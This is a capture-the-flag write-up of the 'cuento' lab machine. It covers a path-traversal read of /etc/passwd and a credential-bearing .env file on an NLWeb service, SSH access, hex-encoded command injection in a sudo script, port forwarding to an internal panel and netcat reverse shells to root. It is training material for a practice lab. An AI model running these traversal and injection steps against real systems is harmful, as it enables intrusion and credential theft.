---
layout: single
title: cuento - The hacker labs
excerpt: "Hello, good morning/evening, friends from TheHackersLabs. This is an update about my previous machine. I tried to use this NLWeb exploit because it is recent and I haven’t seen this service used on other machines. Please excuse any deficiencies in the translation; I used a translator and ChatGPT, as my English is not very good. I hope you enjoy my machine and the vulnerability, because as a player, I believe it meets the requirements for an easy-level machine. I chose privilege escalation through a vulnerable program so that players have to read the code instead of simply searching for CVEs or using automated tools."
date: 2025-10-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-postman/cuento.png
  teaser_home_page: true
  icon: /assets/images/htb-writeup-postman/logothehack.png
categories:
  - the hackers labs
  - infosec
tags:
  - nlweb
  - raton
  - ssh
---

![](/assets/images/htb-writeup-postman/cuento.png)


## Summary

# Exploitation Writeup: Linux Machine - NLWeb Service


# NOTE
```
Hello, good morning/evening, friends from TheHackersLabs.

This is an update about my previous machine. I tried to use this NLWeb exploit because it is recent and I haven’t seen this service used on other machines.

Please excuse any deficiencies in the translation; I used a translator and ChatGPT, as my English is not very good.

I hope you enjoy my machine and the vulnerability, because as a player, I believe it meets the requirements for an easy-level machine.

I chose privilege escalation through a vulnerable program so that players have to read the code instead of simply searching for CVEs or using automated tools.
```


## 📋 Executive Summary

The NLWeb machine was solved by exploiting a Path Traversal vulnerability (CVE-2025-32857) in the web service running o
n port 8080. Through this flaw, sensitive files such as .env were accessed, which revealed credentials and allowed an S
SH login as the user raton.

Subsequently, a vulnerable script (raton.py) with sudo privileges was abused, as it allowed indirect command execution.
 This enabled privilege escalation to the user churrumais.

With this access, an internal service running on port 5000 was discovered and reached through port forwarding. By using
 previously obtained credentials (VillaeEla13), authentication was achieved, and via the web application it was possibl
e to execute code with elevated privileges, ultimately gaining a root shell.



- Web vulnerability (Path Traversal) → Credential exfiltration.
- Abuse of a vulnerable script with sudo → Privilege escalation to another user.
- Port forwarding + internal panel → Remote code execution.
- Reverse shell → Root access.

----

https://medium.com/@guanaonan/three-dots-to-root-how-i-found-a-path-traversal-in-microsofts-agentic-web-nlweb-4e8d8f483
327



---

## 🔍 Phase 1: Reconnaissance and Enumeration

### 1.1 Initial Port Scanning
I used **Nmap** to identify active services on the target machine `192.168.1.76`:

```bash
sudo nmap -p22,8080 -sCV 192.168.1.76
```

**Resultados del Escaneo:**
| Puerto | Estado | Servicio      | Versión          |
|--------|--------|---------------|------------------|
| 22     | Open   | SSH           | OpenSSH 8.2p1 Ubuntu |
| 8080   | Open   | HTTP          |                 |

### 1.2 Web Service Analysis (Port 8080)  
The service on port 8080 corresponds to an **NLWeb** application, which presents an interactive web interface. The appl
ication is developed in Python using the **aiohttp** web framework and exposes several endpoints:

```bash
dirsearch http://192.168.1.76:8080/
```

**Identified Endpoints:**
- `/` - Main page  
- `/ask` - Chatbot query endpoint  
- `/static/` - Static files service  
- `/api/status` - System status endpoint

### 1.3 Path Traversal Vulnerability Detection
The `/static/` endpoint was vulnerable to **Path Traversal** through URL encoding, allowing access to files outside the
 web root directory:

```bash
curl "http://192.168.1.76:8080/static/..%2f..%2f..%2f..%2fetc%2fpasswd"
```

**Successful Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
raton:x:1000:1000:raton,,,:/home/raton:/bin/bash
```

---

## ⚔️ Phase 2: Path Traversal Exploitation and Data Exfiltration

### 2.1 Associated CVE: CVE-2025-32857
The exploited vulnerability corresponds to **CVE-2025-32857** - Path Traversal in NLWeb versions 1.0-1.2.4, which allow
s reading arbitrary files by manipulating parameters in the `/static/` endpoint.

**CVSS Score:** 7.5 (High)  
**Vector de Ataque:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

### 2.2 Exfiltration of the .env File
Exploiting the vulnerability, I exfiltrated the `.env` configuration file from the home directory of the user `raton`:

```bash
curl "http://192.168.1.76:8080/static/..%2f..%2f..%2fhome%2fraton%2fNLWeb%2f.env"
```

**Contenido del Archivo .env:**
```bash
# Database Configuration
DB_HOST=localhost
DB_PORT=5432
DB_NAME=nlweb_production
DB_USER=raton      
DB_PASSWORD=ratonguaton

# External APIs
AZURE_OPENAI_API_KEY=sk-azure-real-key-1234567890abcdef
AZURE_OPENAI_ENDPOINT=https://my-company.openai.azure.com/

# Application Secrets
SECRET_KEY=my-super-secret-key-2024-for-nlweb
JWT_SECRET=jwt-super-secret-Key-123
ENCRYPTION_KEY=encryption-key-789-abc-def

# Service Connections
REDIS_URL=redis://user:redispass123@localhost:6379
ELASTICSEARCH_HOST=http://user:elasticpass@localhost:9200

# Email SMTP Configuration
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_USER=raton@gmail.com
SMTP_PASSWORD=ratonguaton
```


We logged in via SSH:



``` bash
ssh raton@<IP>
```



------------------------------------------------------------------------

## 🐀 User raton and Vulnerable Script

Inside **raton's** Desktop we found a Python script named `raton.py`.
The file had execution permissions with **sudo**:

``` bash
sudo -l
  (churrumais) NOPASSWD: /usr/bin/python3 /home/raton/Desktop/raton.py
```

The script implemented a system resources check, but analyzing it we
discovered it was vulnerable to **Command Injection**, since it allowed
executing arbitrary commands when entering the process identifier.

------------------------------------------------------------------------

## 💀 Escalation of Privileges to Churrumais



The raton.py script is an enterprise monitoring system designed as an interactive console application. Among its multip
le features, the most critical for exploitation is the process diagnostic tool, which contains an obfuscated command ex
ecution vulnerability.

we can run a program as root but we still don't know what it does, let's
read it, it took me some minutes to analyze how to abuse this since it's
a program with 643 lines

![ima](/assets/images/htb-writeup-postman/cuento_v2.png)

Analysis of the Python binary


Enterprise Monitoring System v3.1:

- Includes diagnostic functionality with command execution
- Hexadecimal obfuscated execution vulnerability

```
echo -n "whoami" | xxd -p
77686f616d69
```


![ima](/assets/images/htb-writeup-postman/cuento_v23.png)

The script displays the command output as if it were a memory error, making the exploitation more stealthy.

![ima](/assets/images/htb-writeup-postman/cuento_v24.png)

Let's try to make a reverse shell already knowing the vulnerability


![ima](/assets/images/htb-writeup-postman/cuento_v26.png)


and we should receive a shell since we set up a netcat listener on port 1212.



![ima](/assets/images/htb-writeup-postman/cuento_v25.png)



```
churrumais@cuentos:~$ env
SHELL=/bin/sh
LANGUAGE=en_US:
LOGANALYZER_PASS=VillaeEla13
LC_ADDRESS=es_MX.UTF-8
LC_NAME=es_MX.UTF-8
LC_MONETARY=es_MX.UTF-8
PWD=/home/churrumais
LOGNAME=churrumais
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/churrumais
LC_PAPER=es_MX.UTF-8
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg
=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=0
1;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01
;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;3
1:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;
31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;
31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tg
a=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*
.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;
35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;
35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;3
5:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00
;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.1.74 36278 192.168.1.78 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
LC_IDENTIFICATION=es_MX.UTF-8
TERM=xterm-kitty
LESSOPEN=| /usr/bin/lesspipe %s
USER=churrumais
SHLVL=1
LC_TELEPHONE=es_MX.UTF-8
LC_MEASUREMENT=es_MX.UTF-8
XDG_SESSION_ID=33
XDG_RUNTIME_DIR=/run/user/1002
SSH_CLIENT=192.168.1.74 36278 22
LC_TIME=es_MX.UTF-8
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus
SSH_TTY=/dev/pts/1
LC_NUMERIC=es_MX.UTF-8
_=/usr/bin/env
churrumais@cuentos:~$
```


After a long search using `find` and looking for programs that could help us escalate, we still didn’t find anything. H
owever, thanks to the environment variables we found a password, but it didn’t work for `sudo` or any database, so we’l
l keep it for now.


```
churrumais@cuentos:/home/raton$ id
id
uid=1002(churrumais) gid=1002(churrumais) groups=1002(churrumais)
churrumais@cuentos:/home/raton$ ss -nltp
ss -nltp
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
LISTEN   0        128              0.0.0.0:5000          0.0.0.0:*              
LISTEN   0        5              127.0.0.1:631           0.0.0.0:*              
LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*              
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*              
LISTEN   0        100              0.0.0.0:8080          0.0.0.0:*              
LISTEN   0        5                  [::1]:631              [::]:*              
LISTEN   0        128                 [::]:22               [::]:*              
churrumais@cuentos:/home/raton$
```

Perfect — we gained access as the other user. The raton account has no means to escalate to root, so let's examine the 
other user's privileges.


- Let's run ss-lntp to see if a web page is running.
```
ss-lntp
```

Since we see a webpage running, we’ll try to access it to see if we can do anything else. To forward port 5000 to my ma
chine, we’ll use Local Port Forwarding.

```
ssh -L 1111:127.0.0.1:5000 raton@192.168.1.78
```

And we'll do it using the raton credentials since the password found in env didn't work for SSH.



![ima](/assets/images/htb-writeup-postman/cuento_v27.png)

After verifying that we were able to forward port 5000 to my port 1111 and saw that it looked like a panel, we tried th
e credentials of the user raton as well as common ones (admin, administrator, etc.).

![ima](/assets/images/htb-writeup-postman/cuento_v28.png)

Then we remembered a password we had found: VillaeEla13. We tried it with raton and it worked, and then we used it with
 the user churrumais and it also worked.

![ima](/assets/images/htb-writeup-postman/cuento_v29.png)

It seems that through patterns we can perform a system analysis so that the user churrumais is responsible for monitori
ng it.



![ima](/assets/images/htb-writeup-postman/cuento_v30.png)



Well, we can execute code as root, which is a serious issue: granting elevated privileges—even if the user needs to adm
inister system services—can cause everything to get out of control.



```
nc -lvnp 1414
listening on [any] 1414 ...
```


We tried to set up a listener on port 1414 and get a shell, since we can inject code thanks to the user churrumais havi
ng elevated privileges. Although those privileges are limited to this page, compromising churrumais is sufficient to ac
hieve our goal.

![ima](/assets/images/htb-writeup-postman/cuento_v31.png)

```
Now that we've set up the listener, it's time to execute the reverse shell.
```

```
nc -lvnp 1414
listening on [any] 1414 ...
connect to [192.168.1.74] from (UNKNOWN) [192.168.1.78] 59808
/bin/sh: 0: can't access tty; job control turned off
# whoami     
root
#
```

And perfect we can climb a root.
